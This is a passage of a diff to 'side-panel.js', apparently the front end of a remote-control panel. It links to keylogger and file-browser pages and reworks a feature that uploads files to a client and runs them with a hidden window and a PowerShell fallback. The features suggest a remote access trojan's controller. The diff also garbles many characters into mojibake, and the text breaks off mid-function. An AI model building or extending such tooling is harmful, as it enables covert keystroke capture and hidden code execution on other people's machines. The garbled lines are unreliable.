@@ -1,5 +1,5 @@
-/**
- * side-panel.js — Shared side action panel for desktop viewer & remote desktop pages.
+﻿/**
+ * side-panel.js â€” Shared side action panel for desktop viewer & remote desktop pages.
  * Version: 1.3.0
  *
  * Usage:
@@ -9,11 +9,11 @@
 
 import { playClickSound, playErrorSound, playSuccessSound } from "./sounds.js";
 
-const SIDE_PANEL_JS_VERSION = "1.6.0";
+const SIDE_PANEL_JS_VERSION = "1.8.0";
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Menu definition                                            */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 const PANEL_GROUPS = [
   {
@@ -59,6 +59,7 @@ const PANEL_GROUPS = [
       { label: "Open URL", icon: "fa-solid fa-link", color: "#22d3ee", action: "open-url" },
       { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#fbbf24", action: "message-box" },
       { label: "Big Mouse", icon: "fa-solid fa-arrow-pointer", color: "#4ade80", action: "big-mouse" },
+      { label: "Sound Board", icon: "fa-solid fa-music", color: "#f472b6", open: "soundboard-remote" },
     ],
   },
   {
@@ -78,9 +79,9 @@ const PANEL_GROUPS = [
   },
 ];
 
-/* ──────────────────────────────────────────────────────────── */
-/*  Open-target → URL mapping                                  */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
+/*  Open-target â†’ URL mapping                                  */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 function resolveOpenUrl(clientId, target) {
   switch (target) {
@@ -93,6 +94,7 @@ function resolveOpenUrl(clientId, target) {
     case "processes":   return `/${clientId}/processes`;
     case "keylogger":   return `/${clientId}/keylogger`;
     case "voice":       return `/voice?clientId=${clientId}`;
+    case "soundboard-remote": return `/soundboard-remote?clientId=${clientId}`;
     default:            return null;
   }
 }
@@ -117,9 +119,9 @@ function openFileBrowserWindow(clientId, forceSkin) {
   window.open(`/${clientId}/files`, "_blank", "noopener");
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Toast notifications                                        */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 let toastContainer = null;
 
@@ -153,9 +155,9 @@ function showToast(message, type = "info", durationMs = 4000) {
   }, durationMs);
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  REST helpers                                               */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 async function sendCommand(clientId, action, payload) {
   const body = payload ? { action, ...payload } : { action };
@@ -183,9 +185,9 @@ async function patchClient(clientId, field, value) {
   return res.json().catch(() => ({}));
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Wallpaper upload                                           */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 const ALLOWED_EXTENSIONS = new Set(["jpg", "jpeg", "png", "bmp"]);
 const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
@@ -193,6 +195,53 @@ const WALLPAPER_POLL_MS = 500;
 const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
 const REMOTE_EXECUTE_POLL_MS = 500;
 const REMOTE_EXECUTE_TRANSFER_POLL_MS = 200;
+const REX_READY_STORAGE_PREFIX = "rex:ready:";
+
+function rexReadyStorageKey(clientId) {
+  return `${REX_READY_STORAGE_PREFIX}${clientId}`;
+}
+
+function loadRexReadyJob(clientId) {
+  try {
+    const raw = localStorage.getItem(rexReadyStorageKey(clientId));
+    if (!raw) return null;
+    const parsed = JSON.parse(raw);
+    if (!parsed?.jobId) return null;
+    if (parsed.expiresAt && Number(parsed.expiresAt) < Date.now()) {
+      localStorage.removeItem(rexReadyStorageKey(clientId));
+      return null;
+    }
+    return parsed;
+  } catch {
+    return null;
+  }
+}
+
+function saveRexReadyJob(clientId, job) {
+  try {
+    localStorage.setItem(
+      rexReadyStorageKey(clientId),
+      JSON.stringify({
+        jobId: job.jobId,
+        originalName: job.originalName,
+        destinationPath: job.destinationPath,
+        expiresAt: job.expiresAt,
+        clientVersion: job.clientVersion,
+        transferMethod: job.transferMethod,
+      }),
+    );
+  } catch {
+    /* ignore quota */
+  }
+}
+
+function clearRexReadyJob(clientId) {
+  try {
+    localStorage.removeItem(rexReadyStorageKey(clientId));
+  } catch {
+    /* ignore */
+  }
+}
 
 function formatBytes(bytes) {
   const value = Number(bytes) || 0;
@@ -251,10 +300,10 @@ function renderWallpaperDetails(status, file) {
   const destination = status.destinationPath || "unknown destination";
   const endpoint = status.resolvedUrl || status.pullOrigin || "waiting for transfer endpoint";
   const client = String(status.clientId || "unknown").slice(0, 12);
-  const version = status.clientVersion ? ` · v${status.clientVersion}` : "";
+  const version = status.clientVersion ? ` Â· v${status.clientVersion}` : "";
   return `
-    <div class="sp-progress-detail">${escapeHtml(file.name)} · ${transferred} / ${total} · ${speed}</div>
-    <div class="sp-progress-detail">Client: ${escapeHtml(client)}${escapeHtml(version)} · ${escapeHtml(wallpaperTransferStateLabel(status.transferState))}</div>
+    <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${transferred} / ${total} Â· ${speed}</div>
+    <div class="sp-progress-detail">Client: ${escapeHtml(client)}${escapeHtml(version)} Â· ${escapeHtml(wallpaperTransferStateLabel(status.transferState))}</div>
     <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
     <div class="sp-progress-detail">Endpoint: ${escapeHtml(endpoint)}</div>
   `;
@@ -291,7 +340,7 @@ function triggerWallpaperUpload(clientId) {
 
     const ext = (file.name.split(".").pop() || "").toLowerCase();
     if (!ALLOWED_EXTENSIONS.has(ext)) {
-      showToast(`Unsupported format: .${ext} — use JPG, PNG, or BMP`, "error");
+      showToast(`Unsupported format: .${ext} â€” use JPG, PNG, or BMP`, "error");
       return;
     }
     if (file.size > MAX_FILE_SIZE) {
@@ -343,7 +392,7 @@ function uploadWallpaper(clientId, file) {
     bar.style.width = `${Math.min(45, pct)}%`;
     label.textContent = `Host to server\u2026 ${pct}%`;
     meta.innerHTML = `
-      <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
+      <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
       <div class="sp-progress-detail">Preparing client transfer after staging completes</div>
     `;
   });
@@ -395,7 +444,7 @@ function uploadWallpaper(clientId, file) {
           bar.style.width = "0%";
           label.textContent = "Waiting for client transfer\u2026 0%";
           meta.innerHTML = `
-            <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
+            <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
             <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
             <div class="sp-progress-detail">Endpoint: ${escapeHtml(res.pullOrigin || "waiting for transfer endpoint")}</div>
           `;
@@ -439,16 +488,20 @@ function uploadWallpaper(clientId, file) {
   xhr.send(formData);
 }
 
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Remote Execute                                             */
-/* ──────────────────────────────────────────────────────────── */
+/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
 function remoteExecutePhaseLabel(phase, status) {
   if (phase === "client_transfer") {
     const state = status?.transferState;
     const clientStatus = status?.lastClientStatus;
+    if (clientStatus === "ws_fallback" || status?.transferMethod === "ws_chunks" || status?.usedTransferFallback) {
+      return "WebSocket upload fallback";
+    }
     if (clientStatus === "retrying") return "Retrying client upload";
     if (clientStatus === "requesting") return "Client requesting file";
+    if (clientStatus === "accepted" || clientStatus === "starting") return "Client accepted transfer";
     if (state === "command_sent_no_client_progress" || !status?.clientAcknowledged) {
       return "Waiting for client";
     }
@@ -459,7 +512,11 @@ function remoteExecutePhaseLabel(phase, status) {
     case "queued": return "Queued";
     case "staging": return "Staging on server";
     case "chmod": return "Setting permissions";
-    case "execute": return "Starting process";
+    case "ready": return "Uploaded â€” ready to execute";
+    case "execute":
+      return status?.usedExecFallback || status?.lastClientStatus === "script_fallback"
+        ? "Launching via PowerShell fallback"
+        : "Starting process";
     case "succeeded": return "Execution completed";
     case "failed": return "Failed";
     default: return "Remote execute";
@@ -484,9 +541,15 @@ function remoteExecuteErrorText(status) {
     err.transferState || status?.transferState
       ? `Transfer state: ${remoteExecuteTransferStateLabel(err.transferState || status.transferState)}`
       : "",
+    err.clientVersion || status?.clientVersion ? `Client version: ${err.clientVersion || status.clientVersion}` : "",
+    err.endpointSource || status?.endpointSource
+      ? `Endpoint source: ${wallpaperEndpointSourceLabel(err.endpointSource || status.endpointSource)}`
+      : "",
     `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
     err.destinationPath || status?.destinationPath ? `Destination: ${err.destinationPath || status.destinationPath}` : "",
-    err.pullOrigin || status?.pullOrigin ? `Endpoint: ${err.pullOrigin || status.pullOrigin}` : "",
+    err.resolvedUrl || err.pullOrigin || status?.resolvedUrl || status?.pullOrigin
+      ? `Endpoint: ${err.resolvedUrl || status?.resolvedUrl || err.pullOrigin || status?.pullOrigin}`
+      : "",
     err.clientMessage ? `Client: ${err.clientMessage}` : "",
     err.serverMessage ? `Server: ${err.serverMessage}` : "",
     err.code ? `Code: ${err.code}` : "",
@@ -499,10 +562,10 @@ function formatRemoteExecuteSpeed(status) {
   const speed = Number(status?.speedBytesPerSecond) || 0;
   if (bytes <= 0 && speed <= 0) {
     if (status?.lastClientStatus === "retrying") return "retrying";
-    if (status?.clientAcknowledged) return "connecting…";
-    return "waiting…";
+    if (status?.clientAcknowledged) return "connectingâ€¦";
+    return "waitingâ€¦";
   }
-  if (speed <= 0) return "—";
+  if (speed <= 0) return "â€”";
   return formatSpeed(speed);
 }
 
@@ -511,116 +574,284 @@ function renderRemoteExecuteDetails(status, file) {
   const total = formatBytes(status.totalBytes || file.size || 0);
   const speed = formatRemoteExecuteSpeed(status);
   const destination = status.destinationPath || "unknown destination";
-  const attempt = Number(status.lastClientAttempt) > 0 ? ` · attempt ${status.lastClientAttempt}` : "";
+  const attempt = Number(status.lastClientAttempt) > 0 ? ` Â· attempt ${status.lastClientAttempt}` : "";
+  const version = status.clientVersion ? ` Â· agent v${status.clientVersion}` : "";
   const clientMsg = status.lastClientMessage
     ? `<div class="sp-progress-detail">${escapeHtml(status.lastClientMessage)}${escapeHtml(attempt)}</div>`
     : "";
+  const method =
+    status.transferMethod === "ws_chunks"
+      ? "WebSocket chunks"
+      : status.transferMethod === "shell_pull"
+        ? "Shell download"
+        : status.transferMethod === "http_pull"
+          ? "HTTP pull"
+          : status.usedTransferFallback
+            ? "Fallback transfer"
+            : "";
+  const methodHint = method
+    ? `<div class="sp-progress-detail">Transfer: ${escapeHtml(method)}${status.usedTransferFallback ? " (fallback)" : ""}</div>`
+    : "";
+  const attempts = Array.isArray(status.transferAttempts) && status.transferAttempts.length
+    ? `<div class="sp-progress-detail">Attempts: ${escapeHtml(
+        status.transferAttempts.map((a) => `${a.method}:${a.ok ? "ok" : a.code || "fail"}`).join(" â†’ "),
+      )}</div>`
+    : "";
+  const waitingHint =
+    !status.clientAcknowledged &&
+    status.transferState === "command_sent_no_client_progress" &&
+    !status.usedTransferFallback
+      ? `<div class="sp-progress-detail">No agent progress yet${escapeHtml(version)} â€” trying fallback if available</div>`
+      : "";
   return `
-    <div class="sp-progress-detail">${escapeHtml(file.name)} · ${transferred} / ${total} · ${escapeHtml(speed)}</div>
+    <div class="sp-progress-detail">${escapeHtml(file?.name || status.originalName || "file")} Â· ${transferred} / ${total} Â· ${escapeHtml(speed)}</div>
     <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
-    <div class="sp-progress-detail">${escapeHtml(remoteExecuteTransferStateLabel(status.transferState))}</div>
+    <div class="sp-progress-detail">${escapeHtml(remoteExecuteTransferStateLabel(status.transferState))}${escapeHtml(version)}</div>
+    ${methodHint}
+    ${attempts}
+    ${waitingHint}
     ${clientMsg}
   `;
 }
 
-async function openRemoteExecuteModal(clientId) {
-  const body = await createSpModal({
-    title: "Remote Execute",
-    confirmLabel: "Upload & Run",
-    bodyHtml: `
-      <label class="sp-field">
-        <span>File (any type)</span>
-        <input type="file" data-rex-file class="sp-input" />
-      </label>
-      <label class="sp-field">
-        <span>Arguments (optional)</span>
-        <input type="text" data-rex-args class="sp-input" placeholder='e.g. --silent "/path with spaces"' />
-      </label>
-      <label class="sp-field sp-field-check">
-        <input type="checkbox" data-rex-hide />
-        <span>Hide window (executables/scripts only)</span>
-      </label>
-      <p class="sp-help">Uploads to a temp folder on the client, then runs or opens the file. Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.</p>
-    `,
-    onReady: (overlay) => {
-      const fileInput = overlay.querySelector("[data-rex-file]");
-      if (fileInput) fileInput.focus();
-    },
-  });
-  if (!body) return;
-
-  const fileInput = body.querySelector("[data-rex-file]");
-  const argsInput = body.querySelector("[data-rex-args]");
-  const hideInput = body.querySelector("[data-rex-hide]");
-  const file = fileInput?.files?.[0];
-  if (!file) {
-    showToast("Select a file to execute", "error");
-    return;
+function mountRexPanelHost() {
+  const main = document.querySelector(".viewer-main") || document.body;
+  let host = main.querySelector(".sp-rex-host");
+  if (!host) {
+    host = document.createElement("div");
+    host.className = "sp-rex-host";
+    main.appendChild(host);
   }
-  if (file.size <= 0) {
-    showToast("File is empty", "error");
-    return;
-  }
-  if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
-    showToast(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`, "error");
-    return;
-  }
-
-  uploadRemoteExecute(clientId, file, {
-    args: String(argsInput?.value || "").trim(),
-    hideWindow: !!hideInput?.checked,
-  });
+  return host;
 }
 
-function uploadRemoteExecute(clientId, file, options = {}) {
-  const formData = new FormData();
-  formData.append("file", file);
-  if (options.args) formData.append("args", options.args);
-  if (options.hideWindow) formData.append("hideWindow", "true");
+function setRexSegmentProgress(track, percent) {
+  if (!track) return;
+  const pct = Math.max(0, Math.min(100, Number(percent) || 0));
+  const blocks = track.querySelectorAll(".sp-rex-seg");
+  const n = blocks.length || 20;
+  const filled = Math.round((pct / 100) * n);
+  blocks.forEach((el, i) => {
+    el.classList.toggle("is-on", i < filled);
+  });
+  track.setAttribute("aria-valuenow", String(pct));
+}
 
-  const xhr = new XMLHttpRequest();
+function buildRexSegmentTrackHtml(percent = 0) {
+  const segs = Array.from({ length: 20 }, (_, i) => {
+    const on = i < Math.round((Math.max(0, Math.min(100, percent)) / 100) * 20);
+    return `<span class="sp-rex-seg${on ? " is-on" : ""}"></span>`;
+  }).join("");
+  return `<div class="sp-rex-win98-track" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="${Math.round(percent)}">${segs}</div>`;
+}
 
-  ensureToastContainer();
-  const progressToast = document.createElement("div");
-  progressToast.className = "sp-toast sp-toast-info sp-toast-visible sp-toast-progress";
-  progressToast.innerHTML = `
-    <i class="fa-solid fa-bolt"></i>
-    <span class="sp-progress-label">Preparing remote execute\u2026</span>
-    <button type="button" class="sp-progress-cancel" title="Cancel" aria-label="Cancel">&times;</button>
-    <div class="sp-progress-meta"></div>
-    <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
+function createRemoteExecutePanel(clientId) {
+  const ready = loadRexReadyJob(clientId);
+  const host = mountRexPanelHost();
+  host.querySelectorAll(".sp-rex-panel").forEach((el) => el.remove());
+
+  const panel = document.createElement("div");
+  panel.className = "sp-rex-panel";
+  panel.setAttribute("role", "dialog");
+  panel.setAttribute("aria-modal", "false");
+  panel.innerHTML = `
+    <div class="sp-rex-chrome">
+      <div class="sp-rex-titlebar">
+        <span class="sp-rex-title">Remote Execute</span>
+        <button type="button" class="sp-rex-close" data-rex-close aria-label="Close">&times;</button>
+      </div>
+      <div class="sp-rex-body" data-rex-form>
+        <label class="sp-field">
+          <span>File (any type)</span>
+          <input type="file" data-rex-file class="sp-input" />
+        </label>
+        <label class="sp-field">
+          <span>Arguments (optional)</span>
+          <input type="text" data-rex-args class="sp-input" placeholder='e.g. --silent "/path with spaces"' />
+        </label>
+        <label class="sp-field sp-field-check">
+          <input type="checkbox" data-rex-hide />
+          <span>Hide window (executables/scripts only)</span>
+        </label>
+        <p class="sp-help">
+          <strong>Upload only</strong> stages the file on the client.
+          <strong>Upload &amp; Run</strong> transfers and launches immediately.
+          <strong>Execute only</strong> runs a previously uploaded ready file.
+          Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.
+        </p>
+        <p class="sp-help" data-rex-ready-hint></p>
+      </div>
+      <div class="sp-rex-body sp-rex-progress" data-rex-progress hidden>
+        <div class="sp-rex-progress-label" data-rex-label>Preparing\u2026</div>
+        <div class="sp-rex-progress-meta" data-rex-meta></div>
+        ${buildRexSegmentTrackHtml(0)}
+        <div class="sp-progress-actions" data-rex-actions hidden></div>
+      </div>
+      <div class="sp-rex-footer" data-rex-footer>
+        <button type="button" class="sp-modal-btn sp-modal-btn-cancel" data-rex-close>Cancel</button>
+        <button type="button" class="sp-modal-btn" data-rex-action="execute_only" ${ready ? "" : "disabled"}>Execute only</button>
+        <button type="button" class="sp-modal-btn" data-rex-action="upload_only">Upload only</button>
+        <button type="button" class="sp-modal-btn sp-modal-btn-confirm" data-rex-action="upload_and_run">Upload &amp; Run</button>
+      </div>
+    </div>
   `;
-  toastContainer.appendChild(progressToast);
-  const bar = progressToast.querySelector(".sp-progress-bar");
-  const label = progressToast.querySelector(".sp-progress-label");
-  const meta = progressToast.querySelector(".sp-progress-meta");
-  const cancelBtn = progressToast.querySelector(".sp-progress-cancel");
 
+  const hint = panel.querySelector("[data-rex-ready-hint]");
+  if (ready && hint) {
+    hint.textContent = `Ready on client: ${ready.originalName || ready.jobId} â†’ ${ready.destinationPath || ""}`;
+  } else if (hint) {
+    hint.textContent = "No ready upload for this client yet.";
+  }
+
+  let busy = false;
+  let activeController = null;
+
+  const closePanel = () => {
+    if (busy && activeController) {
+      void activeController.cancel();
+      return;
+    }
+    panel.remove();
+  };
+
+  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+    btn.addEventListener("click", () => closePanel());
+  });
+
+  panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      if (btn.disabled || busy) return;
+      const action = btn.getAttribute("data-rex-action");
+      const fileInput = panel.querySelector("[data-rex-file]");
+      const argsInput = panel.querySelector("[data-rex-args]");
+      const hideInput = panel.querySelector("[data-rex-hide]");
+      const args = String(argsInput?.value || "").trim();
+      const hideWindow = !!hideInput?.checked;
+
+      if (action === "execute_only") {
+        const readyJob = loadRexReadyJob(clientId);
+        if (!readyJob?.jobId) {
+          showToast("No ready upload for this client â€” use Upload only first", "error");
+          return;
+        }
+        busy = true;
+        panel.classList.add("is-busy");
+        activeController = runRemoteExecuteInPanel(panel, clientId, {
+          kind: "execute",
+          jobId: readyJob.jobId,
+          args: args || undefined,
+          hideWindow,
+          displayName: readyJob.originalName,
+          onDone: () => {
+            busy = false;
+            activeController = null;
+            panel.classList.remove("is-busy");
+          },
+        });
+        return;
+      }
+
+      const file = fileInput?.files?.[0];
+      if (!file) {
+        showToast("Select a file to upload", "error");
+        return;
+      }
+      if (file.size <= 0) {
+        showToast("File is empty", "error");
+        return;
+      }
+      if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
+        showToast(
+          `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`,
+          "error",
+        );
+        return;
+      }
+
+      busy = true;
+      panel.classList.add("is-busy");
+      activeController = runRemoteExecuteInPanel(panel, clientId, {
+        kind: "upload",
+        file,
+        args: args || undefined,
+        hideWindow,
+        mode: action === "upload_only" ? "upload_only" : "upload_and_run",
+        onDone: () => {
+          busy = false;
+          activeController = null;
+          panel.classList.remove("is-busy");
+        },
+      });
+    });
+  });
+
+  host.appendChild(panel);
+  panel.querySelector("[data-rex-file]")?.focus();
+}
+
+function openRemoteExecuteModal(clientId) {
+  createRemoteExecutePanel(clientId);
+}
+
+function showRexPanelProgress(panel, { label, percent = 0, metaHtml = "", actionsHtml = "" }) {
+  const form = panel.querySelector("[data-rex-form]");
+  const progress = panel.querySelector("[data-rex-progress]");
+  const footer = panel.querySelector("[data-rex-footer]");
+  const labelEl = panel.querySelector("[data-rex-label]");
+  const metaEl = panel.querySelector("[data-rex-meta]");
+  const actionsEl = panel.querySelector("[data-rex-actions]");
+  const track = panel.querySelector(".sp-rex-win98-track");
+  if (form) form.hidden = true;
+  if (progress) progress.hidden = false;
+  if (footer) footer.hidden = true;
+  if (labelEl) labelEl.textContent = label;
+  if (metaEl) metaEl.innerHTML = metaHtml;
+  setRexSegmentProgress(track, percent);
+  if (actionsEl) {
+    if (actionsHtml) {
+      actionsEl.hidden = false;
+      actionsEl.innerHTML = actionsHtml;
+    } else {
+      actionsEl.hidden = true;
+      actionsEl.innerHTML = "";
+    }
+  }
+}
+
+function runRemoteExecuteInPanel(panel, clientId, options = {}) {
+  const onDone = typeof options.onDone === "function" ? options.onDone : () => {};
   let pollTimer = null;
   let completed = false;
   let cancelling = false;
-  let activeJobId = null;
-  let stagingDone = false;
+  let activeJobId = options.jobId || null;
+  let stagingDone = options.kind === "execute";
+  const xhr = options.kind === "upload" ? new XMLHttpRequest() : null;
 
-  const cleanup = () => {
+  const cleanupTimers = () => {
     if (pollTimer) {
       clearTimeout(pollTimer);
       pollTimer = null;
     }
-    progressToast.remove();
+  };
+
+  const finishIdle = (keepOpen = true) => {
+    cleanupTimers();
+    completed = true;
+    onDone();
+    if (!keepOpen) panel.remove();
   };
 
   async function cancelRemoteExecute() {
     if (completed || cancelling) return;
     cancelling = true;
-    if (pollTimer) {
-      clearTimeout(pollTimer);
-      pollTimer = null;
-    }
-    if (!stagingDone) {
-      try { xhr.abort(); } catch {}
-      completed = true;
-      cleanup();
+    cleanupTimers();
+    if (xhr && !stagingDone) {
+      try {
+        xhr.abort();
+      } catch {
+        /* ignore */
+      }
+      finishIdle(false);
       showToast("Upload cancelled", "info");
       return;
     }
@@ -634,79 +865,214 @@ function uploadRemoteExecute(clientId, file, options = {}) {
         /* best effort */
       }
     }
-    completed = true;
-    cleanup();
+    finishIdle(false);
     showToast("Remote execute cancelled", "info");
   }
 
-  if (cancelBtn) {
-    cancelBtn.addEventListener("click", (e) => {
-      e.preventDefault();
-      e.stopPropagation();
-      void cancelRemoteExecute();
-    });
-  }
-
-  xhr.upload.addEventListener("progress", (e) => {
-    if (!e.lengthComputable || completed) return;
-    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
-    bar.style.width = `${Math.min(10, Math.floor(pct * 0.1))}%`;
-    label.textContent = `Host to server\u2026 ${pct}%`;
-    meta.innerHTML = `
-      <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
-      <div class="sp-progress-detail">Staging before client transfer</div>
-    `;
+  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+    btn.onclick = () => {
+      if (!completed) void cancelRemoteExecute();
+      else panel.remove();
+    };
   });
 
   async function pollJob(jobId) {
     if (completed) return;
     try {
-      const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, { credentials: "include" });
+      const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, {
+        credentials: "include",
+      });
       const status = await res.json().catch(() => ({}));
       if (!res.ok) {
+        if (res.status === 404) {
+          clearRexReadyJob(clientId);
+          throw new Error("Job expired â€” upload again");
+        }
         throw new Error(status.message || `Remote execute status failed: ${res.status}`);
       }
       if (completed) return;
 
-      const pct = status.status === "succeeded" ? 100 : Math.min(99, Math.max(0, Number(status.percent) || 0));
-      bar.style.width = `${pct}%`;
-      label.textContent = `${remoteExecutePhaseLabel(status.phase, status)}\u2026 ${pct}%`;
-      meta.innerHTML = renderRemoteExecuteDetails(status, file);
+      const pct =
+        status.status === "succeeded" || status.status === "ready"
+          ? 100
+          : Math.min(99, Math.max(0, Number(status.percent) || 0));
+      const displayName = options.displayName || options.file?.name || status.originalName || "file";
+      showRexPanelProgress(panel, {
+        label: `${remoteExecutePhaseLabel(status.phase, status)}â€¦ ${pct}%`,
+        percent: pct,
+        metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes || options.file?.size }),
+        actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
+      });
+      panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
+
+      if (status.status === "ready") {
+        completed = true;
+        cleanupTimers();
+        saveRexReadyJob(clientId, status);
+        onDone();
+        showRexPanelProgress(panel, {
+          label: "Uploaded â€” ready to execute",
+          percent: 100,
+          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
+          actionsHtml: `
+            <button type="button" class="sp-progress-action" data-rex-exec>Execute now</button>
+            <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-dismiss>Close</button>
+          `,
+        });
+        panel.querySelector("[data-rex-exec]")?.addEventListener("click", () => {
+          const args = Array.isArray(status.args)
+            ? status.args.map((a) => (/\s/.test(String(a)) ? `"${a}"` : String(a))).join(" ")
+            : options.args;
+          runRemoteExecuteInPanel(panel, clientId, {
+            kind: "execute",
